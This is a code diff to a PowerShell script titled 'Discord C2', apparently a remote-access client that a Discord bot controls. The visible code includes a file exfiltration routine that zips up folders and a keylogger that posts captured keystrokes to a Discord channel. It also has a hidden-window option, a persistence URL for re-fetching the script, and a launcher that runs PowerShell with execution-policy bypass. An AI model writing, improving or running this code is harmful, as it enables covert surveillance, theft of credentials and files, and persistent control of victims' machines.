@@ -1,13 +1,14 @@
 
 # ================================================================ Discord C2 ======================================================================
 
-$token = "$tk" # Discord BOT Token - make sure your bot is in the server you want to use
-$chan = "$ch" # Discord Channel ID - make sure the bot can access this channel
-
-# =============================================================== SCRIPT SETUP =========================================================================
+$token = "$tk" # make sure your bot is in the same server as the webhook
+$chan = "$ch" # make sure the bot AND webhook can access this channel
 
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+
+# =============================================================== SCRIPT SETUP =========================================================================
+
 $version = "1.3.1" # Check version number
 $response = $null
 $previouscmd = $null
@@ -771,8 +772,8 @@ Function Exfiltrate {
                 $entryName = $file.FullName.Substring($folder.Length + 1)
                 [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                 $currentZipSize += $fileSize
-                $messages = PullMsg
-                if ($messages -match "kill") {
+                PullMsg
+                if ($response -like "kill") {
                     sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                     $previouscmd = $response
                     break
@@ -924,8 +925,8 @@ Function KeyCapture {
                     }
                 }
             }
-            $messages = PullMsg
-            if ($messages -match "kill") {
+            PullMsg
+            if ($response -like "kill") {
             sendMsg -Message ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"
             $previouscmd = $response
             $tobat = @"
@@ -940,8 +941,8 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
             }
         }
         finally{
-            $messages = PullMsg
-            If (($keyPressed) -and (!($messages -match "kill"))) {
+            PullMsg
+            If (($keyPressed) -and (!($response -like "kill"))) {
                 $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                 sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                 $keyPressed = $false
